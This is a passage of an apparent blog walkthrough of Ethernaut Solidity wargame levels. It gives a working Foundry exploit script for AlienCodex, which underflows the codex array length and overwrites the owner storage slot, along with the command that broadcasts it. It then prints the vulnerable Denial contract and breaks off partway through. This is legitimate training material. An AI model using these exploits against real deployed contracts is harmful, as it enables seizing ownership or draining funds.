&lt;li&gt;AlineCodex inherits the Ownable contract which has the state variable &lt;code&gt;owner&lt;&#x2F;code&gt;. It will be stored at slot 0 combined with &lt;code&gt;contacted&lt;&#x2F;code&gt; variable.&lt;&#x2F;li&gt;
&lt;li&gt;Here, in the slot 1 the legth of the &lt;code&gt;codex&lt;&#x2F;code&gt; array will be stored and it will be updated whenever a new element is pushed onto the array.&lt;&#x2F;li&gt;
&lt;li&gt;AleinCodex also changes the length of the &lt;code&gt;codex&lt;&#x2F;code&gt; with &lt;code&gt;retract()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;revise()&lt;&#x2F;code&gt; method allows us to modify any existing element of the &lt;code&gt;codex&lt;&#x2F;code&gt; array. Keep in mind that each element will stored at different storage slot.&lt;&#x2F;li&gt;
&lt;li&gt;Initially the length of the &lt;code&gt;codex&lt;&#x2F;code&gt; is 0. If we call the &lt;code&gt;retract()&lt;&#x2F;code&gt; it will be &lt;code&gt;0 - 1&lt;&#x2F;code&gt; which results in underflow and stores the value &lt;strong&gt;&lt;code&gt;2**256 - 1&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; as the length . It is the maximum storage slot index of a contract in ethereum.&lt;&#x2F;li&gt;
&lt;li&gt;So, now the codex array has access to all the storage slots of the contract. We can use this to update the &lt;code&gt;owner&lt;&#x2F;code&gt; value which is stored at the slot 0.&lt;&#x2F;li&gt;
&lt;li&gt;For this we need to find the index of the slot 0. Dynamic arrays finds the elements starting from the slot number &lt;code&gt;uint(keccak256(SLOT_NUMBER_OF_LENGTH))&lt;&#x2F;code&gt;. So, the &lt;code&gt;codex&lt;&#x2F;code&gt; array elements starts from the slot &lt;code&gt;uint(keccak256(1))&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt; codex[0] ==&amp;gt; codex[keccack256(1)]  ==&amp;gt; slot keccack256(1)
&lt;&#x2F;span&gt;&lt;span&gt; codex[1] ==&amp;gt; codex[keccack256(1)+1]  ==&amp;gt; slot keccack256(1)+1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;10&quot;&gt;
&lt;li&gt;We need to find the index of the slot 0. We can do this by pointing our &lt;code&gt;codex&lt;&#x2F;code&gt; array to &lt;strong&gt;&lt;code&gt;2**256&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; index, which is not available and result in an overflow and will points back to the slot 0.&lt;&#x2F;li&gt;
&lt;li&gt;So, we need pass the &lt;code&gt;2**256 - keccack256(1)&lt;&#x2F;code&gt; to the &lt;code&gt;revise()&lt;&#x2F;code&gt; method it will find the index of the slot by using the same method&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt; codex[keccack256(1) + 2**256 - keccack256(1)] 
&lt;&#x2F;span&gt;&lt;span&gt; codex[2**256] ==&amp;gt; slot 2**256 ==&amp;gt; slot 0 (overflow)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;12&quot;&gt;
&lt;li&gt;This will result a overflow and &lt;code&gt;revise()&lt;&#x2F;code&gt; method will modify the content of the owner slot that is zero.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;AlienCodexSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; import {AlienCodex} from &amp;quot;..&#x2F;src&#x2F;AlienCodex.sol&amp;quot;; &#x2F;&#x2F; Not using AlienCodex source contract because of old compiler dependency
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AlienCodexSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    IAlienCodex public alienCodex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IAlienCodex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x92FfB1bd2432d4F2EA1340209742a99FBbFD45d2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 slot0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;load&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(alienCodex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(slot0)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; contacted + owner
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        alienCodex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;makeContact&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        alienCodex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;retract&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; 0 - 1 ==&amp;gt; (2**256) [underflow]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; codex[0] ==&amp;gt; codex[keccack256(1)]  ==&amp;gt; slot keccack256(1)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; codex[1] ==&amp;gt; codex[keccack256(1)+1]  ==&amp;gt; slot keccack256(1)+1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; codex[2**256 - keccack256(1)]  ==&amp;gt; codex[keccack256(1) + 2**256 - keccack256(1)] 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;                                ==&amp;gt; codex[2**256] ==&amp;gt; slot 2**256 ==&amp;gt; slot 0 (overflow)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint ownerSlot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 _content &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;MY_ADDRESS&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        alienCodex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revise&lt;&#x2F;span&gt;&lt;span&gt;(ownerSlot&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_content)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 slot0After &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;load&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(alienCodex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(slot0After)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; contacted + owner
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;IAlienCodex &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;makeContact&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;record&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 _content&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;retract&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revise&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 _content&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;AleinCodexSolve.s.sol:AleinCodexSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;20-denial&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#20-denial&quot; aria-label=&quot;Anchor link for: 20-denial&quot;&gt;20 Denial&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Denial.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;contract Denial {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public partner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw
&lt;&#x2F;span&gt;&lt;span&gt;    address public constant owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA9E&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint timeLastWithdrawn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) withdrawPartnerBalances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; keep track of partners balances
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setWithdrawPartner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _partner&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        partner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_partner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; withdraw 1% to recipient and 1% to owner
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        uint amountToSend &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; perform a call without checking return
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; The recipient can revert, the owner will still get their share
&lt;&#x2F;span&gt;&lt;span&gt;        partner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;amountToSend}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(amountToSend)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; keep track of last withdrawal time
&lt;&#x2F;span&gt;&lt;span&gt;        timeLastWithdrawn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        withdrawPartnerBalances[partner] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+=  &lt;&#x2F;span&gt;&lt;span&gt;amountToSend&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; allow deposit of funds
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() external payable {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; convenience function
